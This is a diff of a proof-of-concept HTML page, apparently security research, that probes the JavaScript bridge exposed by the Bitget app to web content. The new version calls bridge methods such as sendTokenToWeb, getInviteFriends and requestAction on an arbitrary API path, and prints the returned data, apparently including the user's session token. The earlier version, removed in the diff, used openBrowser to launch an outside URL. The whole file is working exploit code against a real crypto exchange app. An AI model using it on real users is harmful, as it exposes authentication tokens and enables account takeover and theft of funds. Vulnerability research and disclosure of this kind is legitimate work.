@@ -1,20 +1,17 @@
 <!DOCTYPE html><html><head><title>Bitget JSBridge PoC</title></head>
 <body>
-<h2>Bitget JSBridge PoC v10 openBrowser only</h2>
+<h2>PoC v11 full callback capture</h2>
 <pre id="out">running...</pre>
 <script>
-function log(s){document.getElementById('out').textContent += "\n" + s;}
+function log(s){document.getElementById('out').textContent += "\n" + JSON.stringify(s);}
+function cb(name){ return function(d){ log(["CB", name, String(d)]); }; }
 setTimeout(function(){
   if (!window.control) { log("NO control"); return; }
   log("control present");
-  try {
-    control.openBrowser(JSON.stringify({
-      appPackage: "org.mozilla.firefox",
-      appName: "FireFox",
-      appUrl: "https://createnewdemo.github.io/bgjspoc/?v=via-openBrowser"
-    }));
-    log("openBrowser invoked");
-  } catch(e){ log("ERR "+e); }
+  try { control.sendTokenToWeb(cb("token")); log("called sendTokenToWeb"); } catch(e){ log("ERR sTTW "+e); }
+  try { control.getInviteFriends(cb("invite")); log("called getInviteFriends"); } catch(e){ log("ERR gif "+e); }
+  try { control.getAppUsdtRateData(cb("rate")); log("called getAppUsdtRateData"); } catch(e){ log("ERR gaurd "+e); }
+  try { control.requestAction(JSON.stringify({path:"/api/v1/poc", params:{a:1}}), cb("ra")); log("called requestAction"); } catch(e){ log("ERR ra "+e); }
   log("done");
 }, 500);
 </script>
